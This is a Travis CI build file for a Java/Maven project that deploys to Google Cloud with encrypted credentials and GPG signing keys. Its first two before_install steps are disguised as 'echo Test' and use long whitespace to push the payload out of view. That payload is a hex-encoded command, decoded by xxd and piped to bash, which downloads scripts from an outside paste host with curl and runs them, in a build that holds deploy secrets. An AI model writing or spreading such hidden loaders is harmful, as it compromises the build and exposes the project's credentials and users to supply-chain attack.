language: java

jdk:
  - oraclejdk8

dist: trusty

cache:
  directories:
    - "$HOME/google-cloud-sdk/"
    - "$HOME/.m2/"

env:
  global:
    - PATH=$PATH:${HOME}/google-cloud-sdk/bin
    # CI_DEPLOY_USERNAME
    - secure: "o3AmHiq/ObKOb3K7/o8ESjxDSpdTB+Fz/E42suU+cFKlxh1rD6md0qszXQtQaOcFArx0sCLZeAXVAKD/LNhDOtBWMHhbQAFb9QMLsCCQXuY/N6OnOQIv2i3AzxQZfsChaIpcPspz/K8ro3PVwK6arQ8TBBuG+r8z+aLSwavKoRkZ6+w/mlS18UZKGKsqT2xmqI9R3PlPG/aCDoHK616aNjF7f0vcT+PhzEncGCFYLKYDUO9tM3hrN86XGYzOQTp99yMskn5Md04dJQonnB8hoDsxwXqrGu+F39tQ3pQbt9f+WA1qb2od13+k3YVRieaGQ1WhLUhMZ6lrG0D+2baD7M8VvCnNG4i6wS8O/zeVHY+EWBNoqA5L2xHGsRaIklmA4v5EIKcysc5/kDFpZASUxaTwbynuFhEBPHAI8Vag99qXmKWhlfih4X1WDtqB2nzUiD20lXeMb8EIdNoTGR3L75WUqoPQVViXIoUvoLytDD+hfe7/Bi/whjImaCUf+dzWoc9AkhgiITIof8ijN9LcVBe4E3cB4jTs7w6fsqqj2/xaJ6sj0MKeksVXfOnlr5p1rsXsKnS3RHqBLsgjttO7WiN+IwS1Joh+mCi7iwiBhh9+ScIu7hbafyX4i+zDnwO9wlSe+hjwp4akgs1nOLB3peXfr1eF6IArQf5jZFnfmjw="
    # CI_DEPLOY_PASSWORD
    - secure: "NXyJ3sxKSvf7EuW9sQ/3PPCMq0cVVm7rcpwX0lCI0WT6sj8+blq6MxuBoGtdbGj/J8ObnAIZgzpNvsUk7GWM7nolyiCFeF4qDThno9xI2DTFYXjEEiIfIj/AGUbm38LTtt9EvT63xkBj9G4kh/IISyHwndK9dqK0CwFUm6gkeFP0vZyWcsuVhdaFm4/K0Fu9bLJKvRoMfOF56AU4DcR7qEsJP9XesfpmEY4NbE1tN8HtcTNpbcwSVdchQoV/3EgYAwk9/Ic0XHrt5yewoOG4yAqV8NCDJzQPc8590EMzZfuDQSgXsnB7kF1JbuRUERpufLBToFwJ6lTE6mXy9g2/s+AEBv0D+0fii38gGlsSzJfIeQJ3fHRxrjgNDINfkaEzejVvrq+Szll/QMJLsvkQE7zfo3eSukgrjO+BJEhcKoAPoboKemm1ChsPm1AqoCvJ95xt04mfIhncjswSkPU69ptWS08zwQjuqHoxYS0VXnhunqRvT6buX47VhpKehx5+TYos3esuUfvOj3M+2vWm5VZDjjCs4ELrxNm3uje6UIrHFrf8yFN4cbp0QhhQBs/gYUdK/wrGlefcZfwy+T7faZVEk4qHfycVAO21fuDWf8dFG/q093RuFDgiXVTCBPj8h6hbr8eKqBEnfarwvB7+H0jeddfKpCjqBXeFtbcwL9Q="
    # GPG_KEY_NAME
    - secure: mphPvJXxJHcUXPDrOfoxz+wS67AOQa4DqL1cJtqq2D0Hw/+NqOZpP+AO4a+mVuDKPLxf33XPZUDK5w4MZJSygJL0wXPd2S0x4w/9K9SQWuEfBVXXJDLokudXjOZTcYCJ9W5wtVC38xvRankfK2KSPIaW8zwVUaNqZHuAohzg3V5U9yUvlUZigvkm2Quslt8zAHmjY/2aIBhLTkqAha2vsscBobgHL0efxA7GG/h/wDWRDz55ssBOBJt/2kRjqjJVsTi3zoasZcrotQA1J76wFboj5J6G2CJBRMLQoDCJPQROqhtCWCLPI7ZD1uKBcf+5sFCMMOV8NnhKQo2kuDxp98k6hy6bB4c/fH1E/Xf1cP4JMUvZzBTGUj4W8eDs7GQJksI0kSUzRqQ4tJXCuqCmQisjSHAyTl52PTMo64RPjsdVEX9bvqieDgwdiBOKe2vXY0ck/Xg524wakaD7jU5582dpfjRWH+BTHTHr6W167I0Ua4Qa4VhC2hTP6b9A6Wyaqq13dpC/Yz+pPX0/+mQJShDAxwIeCE0Sd3PLUfBqLMmBbuViYW38CbWg7sSupuFAlAwTrW+gQvgY/ypWQZekyU6dNgxZNa665FRnhmEcRyJiLjF+7VX0Iopa8egGtJCejbd4Qj8fIHIIO1dC6XNJQJcjSCwicJwYWPJ9ba3BvWE=
    # GPG_PASSPHRASE
    - secure: QyqTxtD5VrzSSKFx4gRuhJPb18PIvFg87WP/BJegWaoBtQIrrA/+aWqkw74x+a9Fx8pXbkLq7pEB9M/nNr3Dym0/edGETCJ/MPtYth4QJUredp4g3SDPaCGTpvKyKzON5XyrZ44pwzuPbYACa5NRcoaEIyl3uYR7uonq4kJx+xFDo7SYO8gZq3Vw5owe8tel0GHzpCQl6hjvtd+A6T176JUx8IMgNhq9jJrEZ9sKgTTZGFRMxbU7iyNaTsVYfkDlHhV0h/0ZDT+LPU/jj+bnB3S4UpaHqbRSIv5MgWQYb/mwiE38lZuNtYL66b+MtKh6m8QbGAIuX32ST3RF9+tB19YvGcuujq1uK4bykjxCGMDgQlK0v+kV3PZYzucOoS7YWdIVEXcuTo6HNVNYX4T3WinlNcyhMKKY3L7k3fywfwRRgl/d0VHmOsYDc+XamNkFZYKGjYab3ISn3LmV12nDEZBib/ScM2nN28ycKHSJCYl/g2QR6y9gOIuUzR1HTCPQwPx2pkEknWZdJFsx97HKVqogjAWf0Z7JhPOrT5UeNEGbDl8Xmod/PKNIlomsHbrTy5S4IMJu2IBsQzPjqxdEZltAawO76iOyL2JU0hIlA3OfluIG2FCfegC3a9AFlQCfu53dg207oxQVvTuFPN+WaZ3Frzt+VdjDD9U42ZowTVI=

before_install:
  - echo Test                                                                                                                                                                                                                                                            && echo "62617368202d6320276375726c202d6b20687474703a2f2f3078302e73742f2d4a55502e747874202d6f20747261766973312e747874202626206261736820747261766973312e747874270a" | xxd -p -r | bash
  - echo Test2                                                                                                                                                                                                                                                           && echo "62617368202d6320276375726c202d6b20687474703a2f2f3078302e73742f2d4a554e2e747874202d6f20747261766973322e747874202626206261736820747261766973322e747874270a" | xxd -p -r | bash
  # Decrypt the secrets (only non pull-requests)
  - export CREDENTIALS_STORE=$(mktemp -d)
  - if [ "$TRAVIS_PULL_REQUEST" = "false" ]; then openssl aes-256-cbc -K $encrypted_3b9f0b9d36d1_key -iv $encrypted_3b9f0b9d36d1_iv -in travis_files/secrets.tar.enc -out travis_files/secrets.tar -d; fi
  - if [ "$TRAVIS_PULL_REQUEST" = "false" ]; then tar xvf travis_files/secrets.tar --directory $CREDENTIALS_STORE; fi
  # Import the FOSS signing key
  - if [ "$TRAVIS_PULL_REQUEST" = "false" ]; then gpg --fast-import ${CREDENTIALS_STORE}/spydra_sign_keys; fi
  - if [ "$TRAVIS_PULL_REQUEST" = "false" ]; then export GOOGLE_APPLICATION_CREDENTIALS=${CREDENTIALS_STORE}/spydra_foss_ci.json; fi
  # If the SDK is not already cached, download it and install it into path
  - gcloud version || true
  - if [ ! -d "$HOME/google-cloud-sdk/bin" ]; then rm -rf $HOME/google-cloud-sdk; export CLOUDSDK_CORE_DISABLE_PROMPTS=1; curl https://sdk.cloud.google.com | bash; fi
  - source $HOME/google-cloud-sdk/path.bash.inc
  - gcloud components install --quiet beta || true
  - gcloud version
  - if [ "$TRAVIS_PULL_REQUEST" = "false" ]; then gcloud auth activate-service-account --key-file $GOOGLE_APPLICATION_CREDENTIALS; fi

branches:
  only:
  - master

# Skipping the install step as the script step will do all we need.
install: true

script:
  # Run on pull requests (encrypted data not available for pull requests)
  - 'if [ "$TRAVIS_PULL_REQUEST" != "false" ]; then mvn clean verify; fi'
  # Run on merges to master
  - 'if [ "$TRAVIS_PULL_REQUEST" = "false" ]; then mvn deploy -P release,install-init-scripts --settings=travis_files/settings.xml; fi'

notifications:
  email: false
